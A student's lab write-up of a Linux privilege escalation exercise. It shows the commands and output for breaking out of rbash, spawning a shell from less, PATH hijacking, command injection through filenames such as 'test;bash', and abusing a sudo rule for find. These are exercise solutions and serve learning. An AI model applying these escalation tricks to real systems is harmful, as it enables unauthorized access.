# Cyber Security - Linux Security

**Student: Philip Magnus**

## Preperation

```bash
$ docker load -i unix_basics.tar.gz
$ docker run -it unix_basics
```

First we need to load the docker image into our local image repository with the first command. The second command starts a docker container with the loaded `unix_basics` image and attaches our terminal session to the standard in- and output of the container.

After starting the container we can start exploring the container.

## Stage 0

The container starts with a restricted shell, in the following `rshell`. The rshell doesn't allow us to change the directory we are working in. So to move freely around the container our first task is to break out of the rshell.

```bash
user@2edddc8fc16e:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
user@2edddc8fc16e:~$ ls -la /usr/bin/ | grep bash
-rwxr-xr-x 1 root root   1183448 Jun 18  2020 bash
-rwxr-xr-x 1 root root      6794 Jun 18  2020 bashbug
lrwxrwxrwx 1 root root         4 Jun 18  2020 rbash -> bash
user@2edddc8fc16e:~$ bash
user@2edddc8fc16e:~$ cd /home/stage1
user@2edddc8fc16e:/home/stage1$
```

To get a better overview of the tools at hand we can take a look at the `$PATH` variable. Here we see that the `$PATH` contains the /usr/bin directory. Checking the directory and it's contents reveals executables we can use systemwide without needing to change the working deirectory. 
The /usr/bin directory contains a bash executable. Simply executing the bash command leads to a new session which is no longer restricted as can be shown by simply changing the directory.

## Stage 1

In the C sourcecode for `stage1` we can see that the program is calling the `less` command on a _stage1.txt_ file. `less` allows the execution of commands by typing a `!`in front of the command, for example: `!bash` would execute the bash command.

With the following commands we can gain more privileges by opening a bash session with the group of the `stage1` executable.

With `id` we can confirm the gained group.

```bash
iuser@eabdf37ef1a9:/home/stage1$ ./stage1

# In the opened less window type the following:
# !bash
# Submit the command with enter. less executes the command and starts a shell
# with the rights of the run ./stage1 executable

user@eabdf37ef1a9:/home/stage1$ id
uid=1000(user) gid=1501(stage1) groups=1501(stage1),1000(user)
```

## Stage 2 

The sourcecode of the `stage2` executable shows that the `cat` command is called on a _stage2.txt_ file. 

The command is called without a full path, this means the system needs to find the `cat` executable via it's `$PATH` variable.

We can exploit this with the following steps:

First we create our own `cat` file in a directory for which we have access rights. Into the `cat` file we enter a simple bash script that executes a command, for our example we use the `id` command.

```bash
user@eabdf37ef1a9:/home/stage2$ mkdir /tmp/stage2
user@eabdf37ef1a9:/home/stage2$ vi /tmp/stage2/cat
```

```bash
#!/bin/bash 
id
```

In the second step we set the right to execute our `cat` file for all users. After that we prepend the `$PATH` with the directory containing our `cat` file and execute `stage2`.

Because our `cat` file will be the first one found when looking at the `$PATH` the system will choose the file which we control for execution.

By calling `stage2` we execute our controlled file with the rights of the `stage2` executable.

```bash
user@eabdf37ef1a9:/home/stage2$ chmod a+x /tmp/stage2/cat
user@eabdf37ef1a9:/home/stage2$ PATH=/tmp/stage2/:$PATH ./stage2
uid=1000(user) gid=1502(stage2) groups=1502(stage2),1000(user)
```

## Stage 3 

```bash 
user@eabdf37ef1a9:/home/stage3$ mkdir /tmp/stage3
user@eabdf37ef1a9:/home/stage3$ touch "/tmp/stage3/test;bash"
user@eabdf37ef1a9:/home/stage3$ ./stage3
Please enter the filename you want to access: /tmp/mytmp/test;bash
/tmp/mytmp/test: empty
user@eabdf37ef1a9:/home/stage3$ id
uid=1000(user) gid=1503(stage3) groups=1503(stage3),1000(user)
```

## Stage 4

```bash
user@2edddc8fc16e:/tmp/stage4$ ln -s /home/stage4/stage4 "test;id"
user@2edddc8fc16e:/tmp/stage4$ "./test;id" 5000 & sleep 0; kill -USR1 $!
user@2edddc8fc16e:/tmp/stage4$ interrupt signal caught, terminating ./test
uid=1000(user) gid=1504(stage4) groups=1504(stage4),1000(user)
```

## Stage 5

```bash
user@2edddc8fc16e:/tmp/stage5$ cat /home/stage5/stage5.txt
Wait, there is no executable here? But you are sure there has to be something. After all you saw the "SUpervisoryDataOrganisation" menue entry when you logged in. So there must be one more level of privilege to gain... But how?

-- Check your privilege!
```

```bash
user@2edddc8fc16e:/tmp/stage5$ ls -la /etc/sudoers.d/
total 16
drwxr-xr-x 1 root root 4096 Feb 20  2022 .
drwxr-xr-x 1 root root 4096 Mar  1 19:27 ..
-r--r----- 1 root root  958 Jan 19  2021 README
-rw-r--r-- 1 root root   42 Feb 20  2022 find
user@2edddc8fc16e:/tmp/stage5$ cat /etc/sudoers.d/find
ALL  ALL=(:stage5) NOPASSWD:/usr/bin/find
user@2edddc8fc16e:/tmp/stage5$ sudo -g stage5 find -exec bash ";"
user@2edddc8fc16e:/tmp/stage5$ id
uid=1000(user) gid=1505(stage5) groups=1505(stage5),1000(user)
```